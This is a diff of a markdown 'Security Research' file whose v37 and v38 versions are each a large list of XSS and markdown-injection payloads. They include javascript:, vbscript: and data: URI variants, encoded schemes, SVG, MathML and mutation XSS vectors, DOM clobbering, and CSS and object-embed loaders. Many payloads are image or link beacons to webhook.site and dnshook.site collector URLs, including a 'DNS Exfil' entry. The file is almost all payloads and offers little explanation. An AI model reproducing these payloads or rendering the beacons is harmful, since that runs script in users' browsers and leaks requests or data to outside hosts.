@@ -1,192 +1,224 @@
-# Security Research - v37
+# Security Research - v38
 
-## Markdown-Specific Edge Cases & Escaping
+## Advanced Polyglot & Mutation XSS Testing
 
-Testing markdown parser vulnerabilities and escaping edge cases.
-
----
-
-### 1) Markdown Image in HTML Attribute
-
-<a href="![test](https://webhook.site/d5f00a91-9c8e-4765-a71b-87f5503a7d03/md-in-href.gif)">Markdown img in href</a>
-
-<div title="![test](https://webhook.site/d5f00a91-9c8e-4765-a71b-87f5503a7d03/md-in-title.gif)">Markdown img in title</div>
+Testing polyglot payloads, mXSS, and advanced bypass techniques.
 
 ---
 
-### 2) Escape Sequence Breaking
+### 1) JavaScript URL Variations
 
-\![not-image](https://webhook.site/d5f00a91-9c8e-4765-a71b-87f5503a7d03/escape1.gif)
+[js1](javascript:alert(1))
 
-!\[broken](https://webhook.site/d5f00a91-9c8e-4765-a71b-87f5503a7d03/escape2.gif)
+[js2](javascript&#58;alert(1))
 
-![test\](https://webhook.site/d5f00a91-9c8e-4765-a71b-87f5503a7d03/escape3.gif)
+[js3](javascript&#x3a;alert(1))
 
-![test](https://webhook.site/d5f00a91-9c8e-4765-a71b-87f5503a7d03/escape4.gif\)
+[js4](&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1))
 
----
+[js5](jAvAsCrIpT:alert(1))
 
-### 3) Reference-Style Links with Injection
+[js6](java	script:alert(1))
 
-[normal-ref]: https://webhook.site/d5f00a91-9c8e-4765-a71b-87f5503a7d03/ref-normal.gif
+[js7](java
+script:alert(1))
 
-![ref-img][normal-ref]
-
-[inject-ref]: javascript:alert(1)
-
-[Try inject ref][inject-ref]
-
-[data-ref]: data:text/html,<script>alert(1)</script>
-
-[Try data ref][data-ref]
+[js8](\u006aavascript:alert(1))
 
 ---
 
-### 4) Nested Markdown Structures
+### 2) VBScript Variations
 
-[![nested-img](https://webhook.site/d5f00a91-9c8e-4765-a71b-87f5503a7d03/nested-img.gif)](https://webhook.site/d5f00a91-9c8e-4765-a71b-87f5503a7d03/nested-link)
+[vbs1](vbscript:msgbox(1))
 
-[![double-nest](https://webhook.site/d5f00a91-9c8e-4765-a71b-87f5503a7d03/double-nest.gif)](javascript:alert(1))
+[vbs2](vbscript&#58;msgbox(1))
 
----
-
-### 5) URL-Encoded Markdown Chars
-
-![%5B%5D](https://webhook.site/d5f00a91-9c8e-4765-a71b-87f5503a7d03/url-encoded-brackets.gif)
-
-![test](https://webhook.site/d5f00a91-9c8e-4765-a71b-87f5503a7d03/%21%5Binjected%5D%28evil%29.gif)
+[vbs3](VbScRiPt:msgbox(1))
 
 ---
 
-### 6) Markdown in Fenced Code Block Injection
+### 3) Data URI Variations
 
-```
-![should-not-render](https://webhook.site/d5f00a91-9c8e-4765-a71b-87f5503a7d03/in-code-block.gif)
-```
+[data1](data:text/html,<script>alert(1)</script>)
 
-```html
-<img src="https://webhook.site/d5f00a91-9c8e-4765-a71b-87f5503a7d03/in-html-code.gif">
-```
+[data2](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)
+
+[data3](data&#58;text/html,<script>alert(1)</script>)
 
 ---
 
-### 7) Incomplete/Malformed Markdown
+### 4) HTML Polyglot Payloads
 
-![](https://webhook.site/d5f00a91-9c8e-4765-a71b-87f5503a7d03/empty-alt.gif)
+<a href="https://webhook.site/2fe47d02-b825-4774-a39b-e7be4327f4e8/poly1"<!--><img src=x onerror=alert(1)>-->safe</a>
 
-![ ](https://webhook.site/d5f00a91-9c8e-4765-a71b-87f5503a7d03/space-alt.gif)
+<a href="https://webhook.site/2fe47d02-b825-4774-a39b-e7be4327f4e8/poly2"/**/onclick=alert(1)>click</a>
 
-![test](
-
-![test]()
-
-![test](https://webhook.site/d5f00a91-9c8e-4765-a71b-87f5503a7d03/valid-after-malformed.gif)
+<a href=javascript:/*</a><img%20src=x%20onerror=alert(1)>//>test</a>
 
 ---
 
-### 8) Unicode in Image Alt/URL
+### 5) mXSS (Mutation XSS) Attempts
 
-![🔥💀](https://webhook.site/d5f00a91-9c8e-4765-a71b-87f5503a7d03/emoji-alt.gif)
+<p id="<img src=x onerror=alert(1)>">mXSS test 1</p>
 
-![test](https://webhook.site/d5f00a91-9c8e-4765-a71b-87f5503a7d03/tëst-üñîcödé.gif)
+<noscript><img src="https://webhook.site/2fe47d02-b825-4774-a39b-e7be4327f4e8/noscript.gif"></noscript>
 
----
-
-### 9) Whitespace Variations in Markdown
-
-![test](   https://webhook.site/d5f00a91-9c8e-4765-a71b-87f5503a7d03/leading-space.gif)
-
-![test](https://webhook.site/d5f00a91-9c8e-4765-a71b-87f5503a7d03/trailing-space.gif   )
-
-![test](	https://webhook.site/d5f00a91-9c8e-4765-a71b-87f5503a7d03/tab.gif)
-
-![test](
-https://webhook.site/d5f00a91-9c8e-4765-a71b-87f5503a7d03/newline.gif
-)
+<math><mi><mglyph><svg><a xlink:href="javascript:alert(1)"><text>mXSS</text></a></svg></mglyph></mi></math>
 
 ---
 
-### 10) Markdown Link Title Injection
+### 6) SVG-Based XSS
 
-![test](https://webhook.site/d5f00a91-9c8e-4765-a71b-87f5503a7d03/title1.gif "Normal title")
+<svg onload="alert(1)">
 
-![test](https://webhook.site/d5f00a91-9c8e-4765-a71b-87f5503a7d03/title2.gif "onclick=alert(1)")
+<svg><script>alert(1)</script></svg>
 
-![test](https://webhook.site/d5f00a91-9c8e-4765-a71b-87f5503a7d03/title3.gif "" onclick="alert(1)")
+<svg><foreignObject><script>alert(1)</script></foreignObject></svg>
 
-![test](https://webhook.site/d5f00a91-9c8e-4765-a71b-87f5503a7d03/title4.gif ')><img src=x onerror=alert(1)>')
+<svg><animate onbegin=alert(1)></svg>
 
----
-
-### 11) Autolink Protocol Abuse
-
-<javascript:alert(1)>
-
-<data:text/html,<script>alert(1)</script>>
-
-<vbscript:alert(1)>
-
-<https://webhook.site/d5f00a91-9c8e-4765-a71b-87f5503a7d03/autolink.gif>
+<svg><set onbegin=alert(1)></svg>
 
 ---
 
-### 12) Task List XSS
+### 7) MathML XSS
 
-- [ ] <script>alert('task')</script>
-- [x] <img src="https://webhook.site/d5f00a91-9c8e-4765-a71b-87f5503a7d03/task-img.gif">
-- [ ] [task link](javascript:alert(1))
+<math><maction actiontype="statusline#http://evil.com">CLICK<mtext>XSS</mtext></maction></math>
 
----
-
-### 13) Blockquote Injection
-
-> <script>alert('quote')</script>
-> ![quote-img](https://webhook.site/d5f00a91-9c8e-4765-a71b-87f5503a7d03/quote-img.gif)
+<math href="javascript:alert(1)">click</math>
 
 ---
 
-### 14) Table Cell XSS
+### 8) Template Element Injection
 
-| Header | Test |
-|--------|------|
-| <script>alert(1)</script> | normal |
-| ![table-img](https://webhook.site/d5f00a91-9c8e-4765-a71b-87f5503a7d03/table-img.gif) | test |
-| [link](javascript:alert(1)) | js link |
+<template><script>alert(1)</script></template>
+
+<template><img src="https://webhook.site/2fe47d02-b825-4774-a39b-e7be4327f4e8/template.gif"></template>
 
 ---
 
-### 15) Footnote Injection
+### 9) Slot Element Injection
 
-This has a footnote[^1].
-
-[^1]: <script>alert('footnote')</script> ![footnote-img](https://webhook.site/d5f00a91-9c8e-4765-a71b-87f5503a7d03/footnote-img.gif)
+<slot name="<img src=x onerror=alert(1)>">slot content</slot>
 
 ---
 
-### 16) Definition List (if supported)
+### 10) Custom Element Testing
 
-Term
-: <script>alert('def')</script>
-: ![def-img](https://webhook.site/d5f00a91-9c8e-4765-a71b-87f5503a7d03/def-img.gif)
+<x-custom onclick="alert(1)">custom element</x-custom>
+
+<img-x src="https://webhook.site/2fe47d02-b825-4774-a39b-e7be4327f4e8/custom-img.gif">
 
 ---
 
-### 17) HTML Entity in Markdown
+### 11) DOM Clobbering Attempts
 
-![test](https://webhook.site/d5f00a91-9c8e-4765-a71b-87f5503a7d03/entity&#x2d;dash.gif)
+<form id="document"><input name="cookie" value="clobbered"></form>
 
-![test](&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3A;alert(1))
+<img name="location" src="https://webhook.site/2fe47d02-b825-4774-a39b-e7be4327f4e8/dom-clob.gif">
+
+<a id="location" href="https://evil.com">clobbered link</a>
+
+<form id="window"><input name="document"></form>
+
+---
+
+### 12) CSS Injection via Attributes
+
+<div style="background-image:url(https://webhook.site/2fe47d02-b825-4774-a39b-e7be4327f4e8/css-bg.gif)">css bg</div>
+
+<div style="behavior:url(https://webhook.site/2fe47d02-b825-4774-a39b-e7be4327f4e8/htc.htc)">htc</div>
+
+<div style="-moz-binding:url(https://webhook.site/2fe47d02-b825-4774-a39b-e7be4327f4e8/xbl.xml)">xbl</div>
+
+<div style="expression(alert(1))">expression</div>
+
+---
+
+### 13) Import/Include Injection
+
+<link rel="import" href="https://webhook.site/2fe47d02-b825-4774-a39b-e7be4327f4e8/import.html">
+
+<link rel="stylesheet" href="https://webhook.site/2fe47d02-b825-4774-a39b-e7be4327f4e8/style.css">
+
+<link rel="prefetch" href="https://webhook.site/2fe47d02-b825-4774-a39b-e7be4327f4e8/prefetch.html">
+
+---
+
+### 14) Meta Refresh/Redirect
+
+<meta http-equiv="refresh" content="0;url=https://webhook.site/2fe47d02-b825-4774-a39b-e7be4327f4e8/meta-refresh">
+
+<meta http-equiv="refresh" content="0;url=javascript:alert(1)">
+
+---
+
+### 15) Object/Embed with Data
+
+<object data="https://webhook.site/2fe47d02-b825-4774-a39b-e7be4327f4e8/object.swf">
+<embed src="https://webhook.site/2fe47d02-b825-4774-a39b-e7be4327f4e8/embed.swf">
+
+<object type="text/x-scriptlet" data="https://webhook.site/2fe47d02-b825-4774-a39b-e7be4327f4e8/scriptlet.sct">
+
+---
+
+### 16) Applet Tag (Legacy)
+
+<applet code="XSS" codebase="https://webhook.site/2fe47d02-b825-4774-a39b-e7be4327f4e8/">
+
+---
+
+### 17) Marquee/BGSOUND (IE Legacy)
+
+<marquee onstart="alert(1)">XSS</marquee>
+
+<bgsound src="https://webhook.site/2fe47d02-b825-4774-a39b-e7be4327f4e8/bgsound.wav">
+
+---
+
+### 18) Isindex (Deprecated)
+
+<isindex action="https://webhook.site/2fe47d02-b825-4774-a39b-e7be4327f4e8/isindex">
+
+---
+
+### 19) Keygen Element
+
+<keygen autofocus onfocus="alert(1)">
+
+---
+
+### 20) Details/Summary XSS
+
+<details open ontoggle="alert(1)">
+<summary>Click me</summary>
+Content
+</details>
+
+---
+
+### 21) Output Element
+
+<output name="result" for="a b">XSS</output>
+
+---
+
+### 22) Menu/MenuItem
+
+<menu type="context" id="mymenu">
+<menuitem label="XSS" onclick="alert(1)"></menuitem>
+</menu>
 
 ---
 
 ### DNS Exfil
 
-![dns](https://v37-dns.d5f00a91-9c8e-4765-a71b-87f5503a7d03.dnshook.site/dns.gif)
+![dns](https://v38-dns.2fe47d02-b825-4774-a39b-e7be4327f4e8.dnshook.site/dns.gif)
 
 ### Canary
 
-![canary](https://webhook.site/d5f00a91-9c8e-4765-a71b-87f5503a7d03/v37-canary.gif)
+![canary](https://webhook.site/2fe47d02-b825-4774-a39b-e7be4327f4e8/v38-canary.gif)
 
 ---
 
-*v37 - Markdown-specific edge cases & escaping*
+*v38 - Advanced polyglot & mutation XSS testing*
